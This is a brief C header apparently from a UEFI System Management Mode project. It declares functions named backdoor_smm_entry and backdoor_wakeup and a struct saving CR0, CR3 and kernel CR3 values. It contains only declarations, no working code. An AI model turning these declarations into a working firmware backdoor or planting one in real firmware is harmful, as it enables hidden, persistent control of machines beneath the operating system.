#ifndef __SMM_H__
#define __SMM_H__


#include "Protocol/SmmBase.h"

extern EFI_SMM_SYSTEM_TABLE* gStmt;

struct ControlRegs {
    UINT64 Cr0;
    UINT64 Cr3;
    UINT64 Cr3Kernel;
};

extern struct ControlRegs gControlRegs;

void backdoor_smm_entry(EFI_SMM_BASE_PROTOCOL* );

EFI_STATUS backdoor_wakeup();

#endif
